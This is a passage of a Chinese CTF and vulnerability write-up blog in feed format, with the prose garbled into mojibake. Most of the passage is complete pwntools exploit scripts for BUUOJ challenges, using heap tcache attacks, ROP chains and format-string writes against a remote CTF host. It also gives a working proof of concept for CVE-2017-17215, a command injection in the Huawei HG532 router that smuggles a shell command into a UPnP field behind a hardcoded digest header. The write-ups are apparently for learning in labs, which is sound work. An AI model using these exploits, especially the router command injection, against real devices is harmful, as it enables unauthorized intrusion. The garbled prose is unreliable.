1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70010100</span>))    <span class="hljs-comment">#reg1 = reg1 + reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x30050001</span>))    <span class="hljs-comment">#reg5 = memory[reg1]</span><br><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010008</span>))    <span class="hljs-comment">#reg1 = 8</span><br>p.sendline(sendcode(<span class="hljs-number">0xc0000001</span>))    <span class="hljs-comment">#reg0 = reg0 &lt;&lt; reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010009</span>))    <span class="hljs-comment">#reg1 = 9</span><br>p.sendline(sendcode(<span class="hljs-number">0x70000001</span>))    <span class="hljs-comment">#reg0 = reg0 + reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x10010004</span>))    <span class="hljs-comment">#reg1 = 4</span><br>p.sendline(sendcode(<span class="hljs-number">0xc0000001</span>))    <span class="hljs-comment">#reg0 = reg0 &lt;&lt; reg1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70040400</span>))    <span class="hljs-comment">#reg4 = reg4 + reg0</span><br><br>p.sendline(sendcode(<span class="hljs-number">0x10000008</span>))    <span class="hljs-comment">#reg0 = 8</span><br>p.sendline(sendcode(<span class="hljs-number">0x80010200</span>))    <span class="hljs-comment">#reg1 = reg2 - reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x40040001</span>))    <span class="hljs-comment">#memory[reg1] = reg4</span><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 1</span><br>p.sendline(sendcode(<span class="hljs-number">0x70010100</span>))    <span class="hljs-comment">#reg1 = reg1 + reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x40050001</span>))    <span class="hljs-comment">#memory[reg1] = reg5</span><br><br><span class="hljs-comment">#p.sendline(sendcode(0xff000000))</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;R4: &#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;R5: &#x27;</span>)<br>leak = (<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">4</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span>) + leak<br>libcbase = leak + <span class="hljs-number">8</span> - libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;?\n&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹</p><h3 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h3><p>ç¨‹åºä¸»è¦é€šè¿‡callocåˆ†é…å †å—ï¼Œåˆ†é…æ—¶ä¸ä¼šä»tcacheå–å‡ºchunkï¼›è™½ç„¶æœ‰mallocå‡½æ•°ï¼Œä½†å¿…é¡»æ»¡è¶³<code>tcache_perthread_struct</code>ä¸­0x220å¤§å°çš„chunkçš„æ•°é‡è‡³å°‘ä¸º7æ‰å¯ä½¿ç”¨mallocåˆ†é…ï¼Œè¿™æ ·å°±æ— æ³•ç›´æ¥å»åˆ©ç”¨tcacheå»å®ç°ä»»æ„åœ°å€å†™ã€‚</p><p>Tcache Stashing Unlink Attackå¯ä»¥å¾ˆå¥½å¾—è§£å†³ä¸Šé¢çš„é—®é¢˜ï¼Œå…·ä½“è¯·çœ‹ï¼š<a href="https://www.anquanke.com/post/id/198173">Tcache Stashing Unlink Attackåˆ©ç”¨æ€è·¯-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>â€‹</p><p>è¿™é“é¢˜çš„æ€è·¯å°±æ˜¯å…ˆç”³è¯·5ä¸ª0x220å¤§å°çš„chunkæ”¾å…¥tcacheä¸­ï¼Œå¾—åˆ°2ä¸ª0x220å¤§å°small chunkåå†ä¿®æ”¹small binçš„æœ€åä¸€ä¸ª chunkçš„bkå€¼ ï¼š</p><img src="/img/10/Screenshot_20230113_045944.png" style="zoom:67%;" /><p>å†æ¬¡ä½¿ç”¨callocæ—¶ï¼Œä¼šå°†ä¿®æ”¹çš„bkå€¼ä¹Ÿå½“ä½œæ˜¯ä¸€ä¸ªçœŸæ­£çš„chunkæ”¾å…¥tcacheä¸­ï¼š</p><img src="/img/10/Screenshot_20230113_050011.png" style="zoom:67%;" /><p>â€‹</p><p>å®Œæ•´expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hitcon_ctf_2019_one_punch&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./hitcon_ctf_2019_one_punch&#x27;)</span><br>p =remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27110</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debut</span>(<span class="hljs-params">idx, name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rename</span>(<span class="hljs-params">idx, name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">retire</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;50056&#x27;</span>)<br>    p.send(content)<br><br>debut(<span class="hljs-number">0</span> ,<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x210</span>)<br>retire(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    rename(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">0</span>)<br><br>debut(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>retire(<span class="hljs-number">0</span>)<br>retire(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x260</span> - <span class="hljs-number">0x220</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    rename(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x26542</span><br>pop_rsi = libcbase + <span class="hljs-number">0x26f9e</span><br>pop_rdx = libcbase + <span class="hljs-number">0x12bda6</span><br>pop_rax = libcbase + <span class="hljs-number">0x47cf8</span><br>syscall_ret = libcbase + <span class="hljs-number">0xcf6c5</span><br><br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf0</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>debut(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x240</span>)<br>retire(<span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    rename(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">2</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x320</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>rename(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">1</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x340</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x240</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x221</span>)  + p64(heap_addr + <span class="hljs-number">0x570</span>) + p64(malloc_hook - <span class="hljs-number">0x38</span>)<br>rename(<span class="hljs-number">2</span>, payload)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x210</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(libcbase + <span class="hljs-number">0x99540</span>)<br>backdoor(payload)<br><br>payload = flat(<br>    p64(pop_rdi), p64(heap_addr + <span class="hljs-number">0x580</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(heap_addr),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">0</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(heap_addr),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">1</span>),<br>    p64(syscall_ret)<br>)<br>payload = payload.ljust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>debut(<span class="hljs-number">1</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹</p><h3 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman_2019_format"></a>xman_2019_format</h3><p>ç¨‹åºå­˜åœ¨å¤šä¸ªå‡½æ•°åµŒå¥—ï¼Œè€Œebpä¸­ä¿å­˜ä¸Šä¸€ä¸ªå‡½æ•°æ ˆçš„å€¼ï¼Œåˆ©ç”¨ebpçš„æ•°æ®ä¿®æ”¹ä¸€å®šçš„åç§»ï¼Œå°†å…¶æŒ‡å‘è¿”å›åœ°å€ï¼Œæœ€åä¿®æ”¹è¿”å›åœ°å€</p><p>â€‹</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;xman_2019_format&#x27;</span>)<br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>num1 = <span class="hljs-number">0x38</span><br>num2 = <span class="hljs-number">0x39</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    payload = <span class="hljs-string">b&#x27;%10$p|&#x27;</span><br>    payload += <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num1 + <span class="hljs-number">4</span>).encode() + <span class="hljs-string">b&#x27;c%10$hhn|%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0xab</span>).encode() + <span class="hljs-string">b&#x27;c%18$hhn|%&#x27;</span> <br>    payload += <span class="hljs-built_in">str</span>(num2 + <span class="hljs-number">4</span>).encode() + <span class="hljs-string">b&#x27;c%10$hhn|%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x85</span>).encode() + <span class="hljs-string">b&#x27;c%18$hhn&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    p.send(payload)<br>    p.recvuntil(<span class="hljs-string">b&#x27;58&#x27;</span>, timeout=<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./xman_2019_format&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27991</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç®€å•å¤ç°CVE-2017-17215</title>
    <link href="/2023/01/01/CVE-2017-17215/"/>
    <url>/2023/01/01/CVE-2017-17215/</url>
    
    <content type="html"><![CDATA[<p>â€‹</p><p>ç”±äºä¸æƒ³é‡æ–°å†å¼€ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œè¿™é‡Œå°±ç›´æ¥ä½¿ç”¨<a href="https://github.com/VulnTotal-Team/IoT-vulhub">IoT-vulhub</a>è¿™ä¸ªé¡¹ç›®æ¥é…ç½®çš„ç¯å¢ƒã€‚</p><p>CVE-2017-17215åœ¨é¡¹ç›®ä¸­åªèƒ½ä¾èµ–äºqemu-systemå¯åŠ¨ï¼Œéœ€è¦æˆ‘ä»¬äº‹å…ˆæ„å»ºå¥½ç›¸åº”qemu-systemçš„dockeré•œåƒã€‚åä¸º HG532è·¯ç”±å™¨çš„å›ºä»¶æ˜¯mipså¤§ç«¯æ¶æ„ï¼Œæ‰€ä»¥å…ˆè¿›å…¥åˆ°<code>/baseImage/qemu-system/mips/images</code>ä¸‹è½½å¥½ç›¸åº”çš„qemuå¯åŠ¨é•œåƒï¼Œå†å»æ„å»º<code>qemu-system:mips</code>çš„dockeré•œåƒ</p><img src="/img/9/Screenshot_20230108_021304.png" style="zoom: 80%;" /><p>æœ€åæŒ‰ç…§é¡¹ç›®çš„<a href="https://github.com/VulnTotal-Team/IoT-vulhub/tree/master/HUAWEI/CVE-2017-17215">æ•™ç¨‹</a>æ¥å°±å¯ä»¥æ­£å¸¸è¿è¡Œå¯åŠ¨ç¯å¢ƒäº†ã€‚</p><p>â€‹</p><p>è¿™é‡Œæ˜¯åœ¨dockerä¸­å†å»è¿è¡Œqemu-systemï¼Œqemu-systemä¸­çš„ipåœ¨æœ¬æœºä¸Šæ˜¯æ— æ³•ç›´æ¥è®¿é—®çš„ï¼Œåœ¨ä½¿ç”¨sshé€šè¿‡2345ç«¯å£è½¬å‘åï¼Œå¦‚æœæƒ³ä½¿ç”¨æœ¬æœºçš„æµè§ˆå™¨å»è®¿é—®è·¯ç”±ç™»å½•ç•Œé¢ä¹Ÿéœ€è¦è®¾ç½®ç›¸åº”çš„ä»£ç†</p><img src="/img/9/Screenshot_20230108_022129.png" style="zoom: 50%;" /><p>ä½¿ç”¨firefoxç›´æ¥å»è®¿é—®<code>http://192.168.2.2/</code>å¯èƒ½æŠ¥é”™ï¼Œéœ€è¦åœ¨<code>about:config</code>ä¸­å»æ›´æ”¹security.tls.version.fallback-limitå’Œsecurity.tls.version.min</p><img src="/img/9/Screenshot_20230108_024054.png"  /><p>æ›´æ”¹åå°±å¯ä»¥æ­£å¸¸è®¿é—®<code>http://192.168.2.2/</code>è·¯ç”±ç™»å½•ç•Œé¢äº†</p><p>â€‹</p><p>pocå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br>headers = &#123;<br>    <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br>&#125;<br> <br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="hljs-string"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="hljs-string">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="hljs-string">   &lt;NewStatusURL&gt;;/bin/busybox ls;&lt;/NewStatusURL&gt;</span><br><span class="hljs-string">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span><br><span class="hljs-string">  &lt;/u:Upgrade&gt;</span><br><span class="hljs-string"> &lt;/s:Body&gt;</span><br><span class="hljs-string">&lt;/s:Envelope&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>response = requests.post(<span class="hljs-string">&#x27;http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1&#x27;</span>,headers=headers,data=data)<br></code></pre></td></tr></table></figure><p>â€‹</p><p>è¿è¡Œå¦‚ä¸‹ï¼š</p><img src="/img/9/Screenshot_20230108_043234.jpg"  /><p>åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥è¿›å…¥dockerä¸­ä½¿ç”¨tcdumpå»æŠ“å–æµé‡ï¼Œç„¶åå¤åˆ¶åˆ°æœ¬æœºä¸­ç”¨Wiresharkå…·ä½“åˆ†æï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">tcpdump -i tap0 -w result.cap<br><br>docker cp <span class="hljs-number">74</span>d6970b35fb:<span class="hljs-regexp">/root/</span>result.cap <span class="hljs-regexp">/home/</span>kali/Desktop<br></code></pre></td></tr></table></figure><p>â€‹</p><p>è¿™ä¸ªå‘½ä»¤æ³¨å…¥çš„å®ç°æ˜¯åœ¨&#x2F;bin&#x2F;upnpè¿™ä¸ªæ–‡ä»¶ä¸­çš„sub_40749cå‡½æ•°å¼•å‘çš„ï¼Œé€šè¿‡å¯¹NewStatusURLå’ŒNewDownloadURLå­—ç¬¦ä¸²çš„äº¤å‰å¼•ç”¨ï¼Œå¾ˆå®¹æ˜“åœ¨binaryninjaå‘ç°è¯¥å‡½æ•°</p><p><img src="/img/9/Screenshot_20230108_044959.png"></p><p>â€‹</p><p>å‚è€ƒï¼š</p><p><a href="https://www.iotsec-zone.com/article?id=187#%E8%AE%BE%E5%A4%87%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90">åä¸ºHG532 - CVE-2017-17215æ¼æ´ç®€æ- IOTsec-Zoneç‰©è”ç½‘å®‰å…¨ç¤¾åŒº</a></p><p>[<a href="https://bbs.kanxue.com/thread-274713.htm">åŸåˆ›]åä¸ºHG532è·¯ç”±å™¨å‘½ä»¤æ³¨å…¥æ¼æ´åˆ†æ(CVE-2017-17215)-æ™ºèƒ½è®¾å¤‡-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buuå¯’å‡ç»ƒä¹ 1</title>
    <link href="/2022/12/30/buu1/"/>
    <url>/2022/12/30/buu1/</url>
    
    <content type="html"><![CDATA[<h3 id="ycb-2020-easy-heap"><a href="#ycb-2020-easy-heap" class="headerlink" title="ycb_2020_easy_heap"></a>ycb_2020_easy_heap</h3><p>ç¨‹åºåœ¨ä½¿ç”¨editåŠŸèƒ½æ—¶å‡ºç°äº†<code>&#39;\x00&#39;</code>å­—èŠ‚æº¢å‡ºï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„prev_size ã€size å’Œ PREV_INUSEæ ‡å¿—ä½ï¼Œè®©å…¶ä¸ä¸Šè¾¹çš„unsorted chunkåˆå¹¶é€ æˆå †å—é‡å </p><img src="/img/8/Screenshot_20230101_012711.png" style="zoom: 80%;" /><p>â€‹</p><p>ç„¶è€Œè¿™é‡Œæ˜¯libc-2.30.soï¼Œä¼šå¯¹åˆå¹¶çš„ä¸Šä¸€ä¸ªchunkçš„sizeæ£€æŸ¥ï¼Œä¸ä¿®æ”¹çš„prev_sizeå¯¹æ¯”ï¼Œè¿™æ ·ä»¥å‰çš„æ–¹æ³•å°±ä¸èƒ½ç»§ç»­ä½¿ç”¨äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//_int_freeä¸­çš„æ£€æŸ¥ç‰‡æ®µ</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>      unlink_chunk (av, p);<br>    &#125;      <br></code></pre></td></tr></table></figure><p>è¿™ç§é«˜ç‰ˆæœ¬çš„off-by-oneæ€»ç»“å¦‚ä¸‹ï¼š</p><ol><li>è®©åˆå¹¶çš„chunkçš„sizeä¸ä¼ªé€ çš„prev_sizeç›¸ç­‰ï¼Œæ‰èƒ½é€šè¿‡æ£€æŸ¥ï¼Œä½†ä¿®æ”¹æ­£å¸¸chunkçš„sizeæ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥åœ¨chunkä¸­å»ä¼ªé€ å¦ä¸€ä¸ªchunkå³å¯ï¼›</li><li>ç”±äºå †å—çš„åˆå¹¶è¿˜è¦é€šè¿‡unlinkçš„æ£€æŸ¥ï¼Œmain_arenaå’Œbssä¸­ä¸€èˆ¬å¹¶ä¸å­˜åœ¨æˆ‘ä»¬ä¼ªé€ chunkçš„åœ°å€ï¼ˆå½“ç„¶æœ‰PIEä¿æŠ¤ä¹Ÿå°±ä¸ç”¨è€ƒè™‘bssï¼‰ï¼Œæ‰€ä»¥éœ€è¦å…ˆå»æ³„æ¼å †åœ°å€ï¼Œæˆ‘ä»¬è‡ªå·±åœ¨å †ä¸Šå†™å…¥ä¼ªé€ chunkçš„åœ°å€ï¼›</li><li>ä¸ä»¥å‰unlinkæ”»å‡»çš„æ€è·¯ä¸€æ ·ï¼Œä¼ªé€ chunkçš„fdå’Œbkä¹Ÿæ˜¯éœ€è¦ä¸æˆ‘ä»¬å†™å…¥çš„åœ°å€ç›¸å¯¹åº”çš„ã€‚</li></ol><p>å…·ä½“æ„é€ å¦‚ä¸‹ï¼š</p><img src="/img/8/Screenshot_20230101_022934.png" style="zoom: 67%;" /><p>â€‹                                                 </p><p>ç¨‹åºå¼€äº†æ²™ç›’ï¼Œåœ¨<code>__free_hook</code>ä¸­å†™å…¥rdiä¸rdxè½¬åŒ–çš„gedgetï¼Œå†ä¸<code>setcontext</code>å‡½æ•°ç›¸ç»“åˆåŠ«æŒrspåˆ°å †ä¸Šï¼Œæœ€åç›´æ¥ROPæˆ–è€…ä½¿ç”¨mprotectåå†™å…¥shellcode</p><p>â€‹                           